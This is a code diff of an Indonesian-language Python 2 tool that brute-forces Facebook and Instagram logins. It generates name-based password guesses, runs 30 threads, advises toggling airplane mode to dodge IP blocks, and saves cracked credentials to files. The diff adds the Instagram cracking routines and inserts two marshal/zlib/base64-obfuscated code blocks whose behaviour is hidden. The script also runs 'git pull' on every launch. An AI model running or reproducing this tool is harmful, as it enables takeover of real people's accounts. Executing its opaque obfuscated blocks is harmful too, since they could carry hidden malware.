@@ -37,8 +37,8 @@ from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup as parser
 from time import sleep as jeda
 from datetime import datetime
-exec(base64.b64decode('Y3QgPSBkYXRldGltZS5ub3coKQ0KbiA9IGN0Lm1vbnRoDQpidWxhbjEgPSB7IjAxIjogIkphbnVhcmkiLCAiMDIiOiAiRmVicnVhcmkiLCAiMDMiOiAiTWFyZXQiLCAiMDQiOiAiQXByaWwiLCAiMDUiOiAiTWVpIiwgIjA2IjogIkp1bmkiLCAiMDciOiAiSnVsaSIsICIwOCI6ICJBZ3VzdHVzIiwgIjA5IjogIlNlcHRlbWJlciIsICIxMCI6ICJPa3RvYmVyIiwgIjExIjogIk5vdmVtYmVyIiwgIjEyIjogIkRlc2VtYmVyIn0NCmJ1bGFuID0gWydKYW51YXJpJywgJ0ZlYnJ1YXJpJywgJ01hcmV0JywgJ0FwcmlsJywgJ01laScsICdKdW5pJywgJ0p1bGknLCAnQWd1c3R1cycsICdTZXB0ZW1iZXInLCAnT2t0b2JlcicsICdOb3ZlbWJlcicsICdEZXNlbWJlciddDQp0cnk6DQogICAgaWYgbiA8IDAgb3IgbiA+IDEyOg0KICAgICAgICBleGl0KCkNCiAgICBuVGVtcCA9IG4gLSAxDQpleGNlcHQgVmFsdWVFcnJvcjoNCiAgICBleGl0KCkNCg0KY3VycmVudCA9IGRhdGV0aW1lLm5vdygpDQp0YSA9IGN1cnJlbnQueWVhcg0KYnUgPSBjdXJyZW50Lm1vbnRoDQpoYSA9IGN1cnJlbnQuZGF5DQpvcCA9IGJ1bGFuW25UZW1wXQ0KcmVsb2FkKHN5cykNCnN5cy5zZXRkZWZhdWx0ZW5jb2RpbmcoJ3V0Zi04JykNCiMgS1VNUFVMQU4gV0FSTkENCk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSA0KSCA9ICdceDFiWzE7OTJtJyAjIEhJSkFVDQpLID0gJ1x4MWJbMTs5M20nICMgS1VOSU5HDQpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQ0KVSA9ICdceDFiWzE7OTVtJyAjIFVOR1UNCk8gPSAnXHgxYlsxOzk2bScgIyBCSVJVIE1VREENClAgPSAnXHgxYlsxOzk3bScgIyBQVVRJSA0KTiA9ICdceDFiWzBtJyAjIFdBUk5BIE1BVEkNCmFjYWsgPSBbTSwgSCwgSywgQiwgVSwgTywgUF0NCndhcm5hID0gcmFuZG9tLmNob2ljZShhY2FrKQ0KdGlsID0i4oCiIg=='))
-ok, cp, id, user, loop = [], [], [], [], 0
+_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', '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', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
+user, mi, status_foll, cr, ok, cp, id, user, loop, looping = [], [], [], [], [], [], [], [], 0, 1
 def jalan(z):
     for e in z + '\n':
         sys.stdout.write(e)
@@ -215,7 +215,8 @@ class ngentod:
                             print("%s [!] Isi yang benar kentod "%(M));self.zona()
                         elif ind in ('1', '01'):
                             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
-                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+                            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -225,7 +226,8 @@ class ngentod:
                             os.remove(self.apk);exit()
                         elif ind in ('2', '02'):
                             print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
-                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+                            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -235,7 +237,8 @@ class ngentod:
                             os.remove(self.apk);exit()
                         elif ind in ('3', '03'):
                             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
-                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+                            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+                            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -265,7 +268,8 @@ class ngentod:
             print("%s [!] Isi yang benar kentod "%(M));self.langsung()
         elif suuu in ('1', '01'):
             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
-            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
             with ThreadPoolExecutor(max_workers=30) as log:
             	for akun in self.id: 
                     try:
@@ -280,7 +284,8 @@ class ngentod:
             os.remove(self.apk);exit()
         elif suuu in ('2', '02'):
             print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
-            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
             with ThreadPoolExecutor(max_workers=30) as log:
             	for akun in self.id: 
                     try:
@@ -295,7 +300,8 @@ class ngentod:
             os.remove(self.apk);exit()
         elif suuu in ('3', '03'):
             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
-            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt\n'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+            print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
+            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
             with ThreadPoolExecutor(max_workers=30) as log:
             	for akun in self.id: 
                     try:
@@ -330,9 +336,9 @@ class ngentod:
             bapi = "https://b-api.facebook.com/method/auth.login"
             response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
             if response.status_code != 200:
+            	loop +=1
             	print ("\r\033[0;91m [!] IP terblokir. hidupkan mode pesawat 2 detik"),
                 sys.stdout.flush()
-                loop +=1
                 b_api(self, user, zona)
             if 'session_key' in response.text and 'EAAA' in response.text:
                 print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,response.json()['access_token'])
@@ -482,6 +488,82 @@ class ngentod:
         rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
         print('\r %s*--> %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
+def crack2(user, pwx):
+	global looping, loping
+	c_bff_ = len(pwx)
+	for pas in pwx:
+		if looping != 1:
+			pass
+		else:
+			if len(status_foll) != 1:
+				rm = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"])
+				print "\r "+rm+"*--> %s/%s [OK:%s]-[CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
+				sys.stdout.flush()
+				c_bff_ -= 1
+			else:
+				pass
+		try:
+			if user in ok or user in cp:
+				break
+			pw = pas.lower()
+			try:
+				headerz = {"User-Agent": user_agentz_api}
+				with requests.Session() as ses:
+					urll = "https://www.instagram.com/"
+					data = ses.get(urll, headers=headerz).content
+					tokett = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
+				header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": tokett,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,
+						 }
+				param = {"username": user,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pw),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
+						}
+			except:
+				header = {}
+				param = {}
+				pass
+			with requests.Session() as ses:
+				url = "https://www.instagram.com/accounts/login/ajax/"
+				respon = ses.post(url, data=param, headers=header)
+				data = json.loads(respon.content);jeda(00.1)
+				# print ("\r",data)
+				# print ("\r *--> %s,%s,|,%s,%s            "%(P,user,H,pw))
+				if "checkpoint_url" in str(data):
+					cepeh = "Checkpoint"
+					ingfo(user, pw, cepeh)
+					with open("cepeh.txt", "a") as simpan:
+						simpan.write(" [Checkpoint] "+user+" ◊ "+pw+"\n")
+					cp.append(user)
+					break
+				elif "userId" in str(data):
+					okeh = "Berhasil"
+					if len(status_foll) != 1:
+						ingfo(user, pw, okeh)
+						with open("okeh.txt", "a")as simpan:
+							simpan.write(" [Berhasil] "+user+" ◊ "+pw+"\n")
+						ok.append(user)
+						#follow(ses,user)
+					break
+				elif "Please wait" in str(data):
+					print ("\r%s[!] Mode pesawatkan 2 detik  "%(M)),
+					looping+=1
+					sys.stdout.flush()
+					pwx = [pw]
+					crack2(user, pwx)
+					loping -= 1
+				else:
+					looping = 1
+					pass
+		except requests.exceptions.ConnectionError:
+			print ("\r%s[!] Tidak ada koneksi Internet "%(M)),
+			sys.stdout.flush()
+			looping+=1
+			pwx = [pw]
+			crack2(user, pwx)
+			loping -= 1
+		except:
+			looping = 1
+			pass
+	loping+=1
+None
 # GANTI USER AGENT
 def useragent():
 	print ("\n%s [%s01%s] Ganti user agent "%(P,K,P))
@@ -538,13 +620,14 @@ def menu():
     print ('\n %s[ welcome %s%s%s ] \n'%(P,K,nama,P))
     print (' [%s01%s] Dump id public'%(K,P)) 
     print (' [%s02%s] Dump id followers'%(K,P)) 
-    print (' [%s03%s] Dump id reaction post'%(K,P)) 
-    print (' [%s04%s] %sStart crack %s'%(K,P,H,P)) 
-    print (' [%s05%s] Ganti user agent'%(K,P)) 
-    print (' [%s06%s] Cek hasil crack'%(K,P)) 
-    #print (' [%s07%s] Gabung group'%(K,P))
-    #print (' [%s08%s] Info script'%(K,P))
-    print (' [%s00%s] Keluar (hapus token)'%(M,P))
+    print (' [%s03%s] Dump id reaction post'%(K,P))
+    print (' [%s04%s] Crack cari nama (instagram) '%(K,P))
+    print (' [%s05%s] %sStart crack %s'%(K,P,H,P)) 
+    print (' [%s06%s] Setting user agent'%(K,P)) 
+    print (' [%s07%s] Cek hasil crack'%(K,P)) 
+    #print (' [%s08%s] Gabung group'%(K,P))
+    #print (' [%s09%s] Info script'%(K,P))
+    print (' [%s00%s] Hapus token '%(M,P))
     unik = raw_input('\n%s [?] Menu : %s'%(P,K))
     if unik == '':
         print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
@@ -555,36 +638,19 @@ def menu():
     elif unik in['3','03']:
         postingan(romz)
     elif unik in['4','04']:
-        ngentod().romiy()
+    	igg()
     elif unik in['5','05']:
-    	useragent()
+        ngentod().romiy()
     elif unik in['6','06']:
-    	try:
-            dirs = os.listdir("hasil")
-            print
-            for file in dirs:
-                print("%s -> %s%s"%(K,P,file));jeda(0.2)
-            print("\n %s[%s!%s] cth : CP-%s-%s-%s%s"%(P,M,P,ha,op,ta,".txt"))
-            file = raw_input("%s [?] masukan file : "%(P));jeda(0.2)
-            if file == "":
-                print("%s [!] file tidak ada "%(M))
-            total = open("hasil/%s"%(file)).read().splitlines()
-            print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
-            nm_file = ("%s"%(file)).replace("-", " ")
-            jalan(" [%s*%s] total akun : %s"%(K,P,len(total)))
-            print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
-            for akun in total:
-            	fb = akun.replace("\n","")
-                tling  = fb.replace(" *--> ", " *-->").replace(" *-->", " *--> ")
-                print(tling);jeda(0.03)
-            print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
-            raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
-        except (IOError):
-            print("\n%s [!] tidak ada hasil "%(M))
-            raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
+    	useragent()
     elif unik in['7','07']:
-        os.system("xdg-open https://www.facebook.com/groups/924679595149360")
+    	print "\n%s [01] Hasil crack akun facebook "%(P)
+        print "%s [02] Hasil crack akun instagram "%(P)
+        c = raw_input('\n%s [?] Menu : %s'%(P,K))
+    	hasill(c)
     elif unik in['8','08']:
+        os.system("xdg-open https://www.facebook.com/groups/924679595149360")
+    elif unik in['9','09']:
         print(ingfo)
     elif unik in['0','00']:
         print ('')
@@ -592,8 +658,121 @@ def menu():
         jalan('\n%s [√] berhasil terhapus '%(H));exit()
     else:
         print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
-        
+def hasill(c):
+	if c in[""]:
+		print ("%s[%s!%s] isi yang benar kentod"%(P,M,P));exit()
+	elif c in["1","01"]:
+		try:
+			dirs = os.listdir("hasil")
+			print ("")
+			for file in dirs:
+				print("%s -> %s%s"%(K,P,file));jeda(0.2)
+			print("\n %s[%s!%s] cth : CP-%s-%s-%s%s"%(P,M,P,ha,op,ta,".txt"))
+			file = raw_input("%s [?] masukan file : "%(P));jeda(0.2)
+			if file == "":
+				print("%s [!] file tidak ada "%(M))
+			total = open("hasil/%s"%(file)).read().splitlines()
+			print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
+			nm_file = ("%s"%(file)).replace("-", " ")
+			jalan(" [%s*%s] total akun : %s"%(K,P,len(total)))
+			print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
+			for akun in total:
+				fb = akun.replace("\n","")
+				tling  = fb.replace(" *--> ", " *-->").replace(" *-->", " *--> ")
+				print(tling);jeda(0.03)
+			print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
+			raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
+		except (IOError):
+			print("\n%s [!] tidak ada hasil "%(M))
+			raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
+	elif c in["2","02"]:
+		print "\n%s [01] Hasil crack akun %sOK "%(P,H)
+        print "%s [02] Hasil crack akun %sCP "%(P,K)
+        while True:
+        	rom = raw_input('\n%s [?] Menu : %s'%(P,K))
+		if rom in['1','01']:
+			try:
+				oke = open("okeh.txt", "r").readlines()
+				print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
+				jalan(" [%s*%s] total akun : %s%s"%(K,P,H,str(len(oke))))
+				print(" %s[%s*%s] --------------------------------------%s"%(P,K,P,H));jeda(2)
+				okek = open("okeh.txt", "r").read()
+				print (okek)
+				exit(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
+			except IOError,KeyError:
+				exit (M+"\n [!] tidak ada hasil awokawokawok")
+		elif rom in['2','02']:
+			try:
+				cepe = open("cepeh.txt", "r").readlines()
+				print(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
+				jalan(" [%s*%s] total akun : %s%s"%(K,P,K,str(len(cepe))))
+				print(" %s[%s*%s] --------------------------------------%s"%(P,K,P,K));jeda(2)
+				cepek = open("cepeh.txt", "r").read()
+				print (cepek)
+				exit(" %s[%s*%s] --------------------------------------"%(P,K,P));jeda(2)
+			except IOError,KeyError:
+				exit (M+"\n [!] tidak ada hasil awokawokawok")
+		else:
+			exit()
+def igg():
+	print ("\n%s [%s!%s] Cth nama %s: %sRomi "%(P,M,P,M,K))
+	usr_ = raw_input('%s [?] Input nama > %s'%(P,K))
+	jumlah = input('%s [?] Limit user > %s'%(P,K))
+	bff_2 = usr_.replace(" ", "")
+	cr.append("romi_afrizal")
+	mi.append(bff_2+"|"+bff_2)
+	mi.append(bff_2+"_"+"|"+bff_2)
+	for _i_ in range(1, jumlah+1):
+		mi.append(bff_2+str(_i_)+"|"+bff_2)
+		mi.append(bff_2+"_"+str(_i_)+"|"+bff_2)
+		mi.append(bff_2+str(_i_)+"_"+"|"+bff_2)
+	print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s okeh.txt'%(P,K,P,H,P,H);jeda(0.2)
+	print '%s [%s*%s] akun %sCP %stersimpan di > %scepeh.txt\n'%(P,K,P,K,P,K);jeda(0.2)
+	with ThreadPoolExecutor(max_workers=30) as log:
+		for ro in mi:
+			try:
+				_bff_ = []
+				_r_ = ro.encode("utf-8")
+				_o_ = _r_.split("|")[0]
+				_m_ = _r_.split("|")[1]
+				_i_ = _m_.split()
+				if len(cr) != 1:
+					if len(_o_) >= 6:
+						_bff_.append(_o_)
+						if len(_i_[0]) <= 2:
+							if len(_i_) >= 2:
+								_bff_.append(_i_[0]+_i_[1])
+							if len(_m_) >= 6:
+								_bff_.append(_m_)
+						else:
+							_bff_.append(_i_[0]+"123")
+							if len(_i_) >= 2:
+								_bff_.append(_i_[0]+_i_[1])
+							if len(_m_) >= 6:
+								_bff_.append(_m_)
+					else:
+						_bff_.append(_o_+_o_)
+						if len(_i_[0]) <= 2:
+							if len(_i_) >= 2:
+								_bff_.append(_i_[0]+_i_[1])
+							if len(_m_) >= 6:
+								_bff_.append(_m_)
+						else:
+							if len(_i_) >= 2:
+								_bff_.append(_i_[0]+_i_[1])
+							_bff_.append(_i_[0]+"123")
+							if len(_m_) >= 6:
+								_bff_.append(_m_)
+				else:
+					_bff_.append(_i_[0]+"123")
+					_bff_.append(_i_[0]+"12345")
+					_bff_.append(_o_)
+				log.submit(crack2, _o_, _bff_)
+			except: pass
+	exit("%s• finished"%(H))
+_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJx1Us1q20AQnrFkO3ZS00MI8c3QBkTBFr30UNo0aQ4NFHJIKC25CEW7lmXLWkU7QqQop/TUF0ifoA/WJ+nMOv2B0oX5kfabb2Z2JoGHgyxHLHaflQL4AnDJTgdQIVx2xLsYBB5fJqK6LD2WEwn5zurmGxDAEoHhLcAe4zME4kAPXtwh3nrQerD04I5ZfRirLoxvfWh9UD0Yxxuvz/+3+KsLLQcOYNWByoIaAvWEtGXCLsx92Ht3Wjx1mG2HuXeY/j8YgI9FHxCxQPjETV0EO1zqmX3CekFU2pdh2DTNLCssxWkVr2eJWYcHNnwTRfHr58zIOB0rXVk7ZP+D1dX0ONUFuSuOKBfXOfns13zF3QJkih6z0SrV0dzkuWm0iq5uSF4sMTWHbrH3VleL2Ga5K+XRgZ08m04PJ2x/3H/9y/w+JOlPFjpZlSYrKBAOR1Tp61pbsiRTSTXR9kMxUSx1fnbFLa0pHCBTqYsqdZFmq5pIxn7q9PtAKjyXFlwfZUMyYH4Yqjfsil1/Y6NAdsYpO2IVWpXElQqvDM3KTa9Zkc4N/tooQK8zwV0c4gh3cF+k46MnO8IDcXt1viupJcGZKbRLnpuSaf7k+m9C6enV2qg614cup9AMRj7+BEx1j/c=', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
+      
 if __name__ == '__main__':
     os.system('git pull')
     folder()
-    menu()
+    menu()    
